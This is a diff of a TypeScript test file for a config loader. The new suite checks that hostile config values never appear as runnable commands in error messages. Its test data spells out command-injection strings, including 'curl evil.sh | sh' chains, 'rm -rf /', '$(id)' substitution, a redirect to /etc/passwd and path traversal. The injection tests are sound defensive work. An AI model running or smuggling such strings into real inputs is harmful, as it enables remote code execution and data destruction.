@@ -39,45 +39,9 @@ describe('config loader', () => {
     expect(pinned.presence.ttl_ms).toBe(500_000);
   });
 
-  it('rejects presence.ttl_ms below heartbeat_ms; accepts ttl_ms >= heartbeat_ms and the 3× default', () => {
-    // A pinned ttl below the (default 600s) heartbeat would read every live peer offline between beats.
-    expect(() =>
-      parseConfig({ identity: { handle: 'h' }, topics: ['ctx'], presence: { ttl_ms: 5 } }),
-    ).toThrow(/ttl_ms must be >= .*heartbeat_ms/);
-    // An explicit ttl >= heartbeat still parses...
-    expect(() =>
-      parseConfig({
-        identity: { handle: 'h' },
-        topics: ['ctx'],
-        presence: { heartbeat_ms: 60_000, ttl_ms: 500_000 },
-      }),
-    ).not.toThrow();
-    // ...as does the dependent-default (ttl = 3× heartbeat).
-    expect(() => parseConfig({ identity: { handle: 'h' }, topics: ['ctx'] })).not.toThrow();
-  });
-
-  // post_topics are matched against caller-supplied topics, so a pattern that can be driven into
-  // catastrophic backtracking is a config error, not a runtime surprise. Guard the class.
-  it.each([
-    ['nested quantifier', '([a-z]+)+'],
-    ['alternation under a quantifier', '(a|a)*'],
-    ['bounded repeat over a risky body', '([a-z]*){15}'],
-    ['optional group repeated many times', '(a?){250}'],
-    ['too many unbounded quantifiers', '.*.*.*.*.*'],
-  ])('rejects a post_topics pattern that risks catastrophic backtracking (%s)', (_l, pattern) => {
-    expect(() =>
-      parseConfig({ identity: { handle: 'h' }, topics: ['a'], post_topics: [pattern] }),
-    ).toThrow(/catastrophic backtracking/);
-  });
-
-  it.each([['ctx-.*'], ['project-[a-z0-9-]+'], ['(alpha|beta)-.*'], ['ctx-\\d{1,4}']])(
-    'still accepts an ordinary post_topics pattern (%s)',
-    (pattern) => {
-      const cfg = parseConfig({ identity: { handle: 'h' }, topics: ['a'], post_topics: [pattern] });
-      expect(cfg.post_topics).toEqual([pattern]);
-    },
-  );
-
+  // Which post_topics sources are refused is graded against the shared hostile/safe corpus in
+  // regex-screen-parity.test.ts, and the ttl/heartbeat rule at its own boundary in
+  // stated-bounds.test.ts.
   it('accepts post_topics and rejects an uncompilable regex', () => {
     const cfg = parseConfig({ identity: { handle: 'h' }, topics: ['a'], post_topics: ['ctx-.*'] });
     expect(cfg.post_topics).toEqual(['ctx-.*']);
@@ -123,23 +87,6 @@ describe('config loader', () => {
       backend_config: { db_path: '/tmp/x.db', poll_interval_ms: 250 },
     });
     expect(cfg.backend_config).toEqual({ db_path: '/tmp/x.db', poll_interval_ms: 250 });
-  });
-
-  it.each([
-    ['local-sqlite', 'parley-sqlite'],
-    ['matrix', 'parley-matrix'],
-    ['local-redis', 'parley-redis'],
-  ])('rejects the removed `backend` field (%s) and names the binary to run', (value, binary) => {
-    const load = (): unknown =>
-      parseConfig({ backend: value, identity: { handle: 'h' }, topics: ['a'] });
-    expect(load).toThrow(/`backend` is not a supported field/);
-    expect(load).toThrow(new RegExp(binary));
-  });
-
-  it('rejects a non-string `backend` without claiming a specific binary', () => {
-    expect(() => parseConfig({ backend: 42, identity: { handle: 'h' }, topics: ['a'] })).toThrow(
-      /`backend` is not a supported field/,
-    );
   });
 
   it('rejects permissions.skip_permissions: true as unimplemented', () => {
@@ -538,5 +485,101 @@ describe('mention_filter requires a mentionable handle', () => {
         live_push: { enabled: true, mention_filter: false },
       }),
     ).not.toThrow();
+  });
+});
+
+// An error message shaped as a command is a command an operator will paste, and `backend:` is the one
+// place a config VALUE was interpolated into one. A config file is not always operator-authored end
+// to end — generated, templated, or committed by someone else — so grade the CLASS: no value drawn
+// from the input may appear inside backticks unless it is a bare package-name token, and no backticked
+// span in any parseConfig error may carry a shell metacharacter or a control byte at all.
+describe('no config value reaches a runnable suggestion', () => {
+  const HOSTILE_VALUES: readonly (readonly [string, string])[] = [
+    ['shell chain', 'sqlite && curl evil.sh | sh'],
+    ['command substitution', 'sqlite$(id)'],
+    ['backtick substitution', 'sqlite`id`'],
+    ['semicolon', 'sqlite; rm -rf /'],
+    ['pipe to shell', 'sqlite|sh'],
+    ['redirect', 'sqlite > /etc/passwd'],
+    ['newline', 'sqlite\ncurl evil.sh | sh'],
+    ['carriage return', 'sqlite\rcurl evil.sh'],
+    ['ANSI erase-line', 'sqlite\u001b[2Kcurl evil.sh'],
+    ['tab and quotes', 'sqlite\t"x"'],
+    ['leading dash', '--version'],
+    ['path traversal', '../../../../bin/sh'],
+    ['scoped package', '@evil/parley-sqlite'],
+    ['trailing space', 'sqlite '],
+    ['uppercase', 'SQLITE'],
+    ['ten kilobytes', 'a'.repeat(10_000)],
+  ] as const;
+
+  // Values that ARE a bare package suffix: the suggestion must still be built for these, so that
+  // narrowing the gate cannot be satisfied by dropping the operator's guidance altogether.
+  const SAFE_VALUES = ['sqlite', 'local-sqlite', 'matrix', 'redis', 'x', 'a-b-c9'] as const;
+
+  const GENERIC_SUGGESTION = /parley-sqlite, parley-matrix, parley-redis/;
+  /** Anything that changes what a pasted command does, plus every C0 control byte. */
+  const NOT_A_COMMAND = /[;&|$><`"'\\\u0000-\u001f]/;
+
+  function runnableSpans(message: string): string[] {
+    return [...message.matchAll(/`([^`]*)`/g)].map((m) => m[1]!);
+  }
+
+  function messageFor(raw: unknown): string {
+    try {
+      parseConfig(raw);
+    } catch (e) {
+      return (e as Error).message;
+    }
+    return '';
+  }
+
+  it.each(HOSTILE_VALUES)('never suggests running a hostile `backend` value (%s)', (_l, value) => {
+    const message = messageFor({ backend: value, identity: { handle: 'h' }, topics: ['a'] });
+    expect(message).toMatch(/`backend` is not a supported field/);
+    expect(message).toMatch(GENERIC_SUGGESTION);
+    expect(message).not.toContain(`parley-${value.replace(/^local-/, '')}`);
+    for (const span of runnableSpans(message)) expect(span).not.toMatch(NOT_A_COMMAND);
+  });
+
+  it.each(SAFE_VALUES)('still names the binary for a bare backend suffix (%s)', (value) => {
+    const message = messageFor({ backend: value, identity: { handle: 'h' }, topics: ['a'] });
+    expect(message).toContain(`parley-${value.replace(/^local-/, '')}`);
+    for (const span of runnableSpans(message)) expect(span).not.toMatch(NOT_A_COMMAND);
+  });
+
+  it.each([
+    ['number', 42],
+    ['null', null],
+    ['boolean', true],
+    ['object', { name: 'sqlite' }],
+    ['array', ['sqlite']],
+  ])('refuses a non-string `backend` (%s) without claiming a binary', (_l, value) => {
+    const message = messageFor({ backend: value, identity: { handle: 'h' }, topics: ['a'] });
+    expect(message).toMatch(/`backend` is not a supported field/);
+    expect(message).toMatch(GENERIC_SUGGESTION);
+    for (const span of runnableSpans(message)) expect(span).not.toMatch(NOT_A_COMMAND);
+  });
+
+  // The same class, one field at a time, over the strings an operator populates: whichever field a
+  // hostile value lands in, whatever message comes back must not read as a command to run.
+  const FIELDS = ['instance_id', 'state_path', 'topics', 'post_topics', 'presence'] as const;
+  const FIELD_ROWS = FIELDS.flatMap((field) =>
+    HOSTILE_VALUES.map(([label, value]) => {
+      const raw: Record<string, unknown> = { identity: { handle: 'h' }, topics: ['a'] };
+      if (field === 'topics' || field === 'post_topics') raw[field] = [value];
+      else if (field === 'presence') raw.presence = { topic: value };
+      else raw[field] = value;
+      return [`${field} = ${label}`, raw] as const;
+    }),
+  );
+
+  it('crosses every populated string field with every hostile value', () => {
+    expect(FIELD_ROWS.length).toBe(FIELDS.length * HOSTILE_VALUES.length);
+    expect(FIELD_ROWS.length).toBeGreaterThan(60);
+  });
+
+  it.each(FIELD_ROWS)('never renders %s as a command', (_label, raw) => {
+    for (const span of runnableSpans(messageFor(raw))) expect(span).not.toMatch(NOT_A_COMMAND);
   });
 });
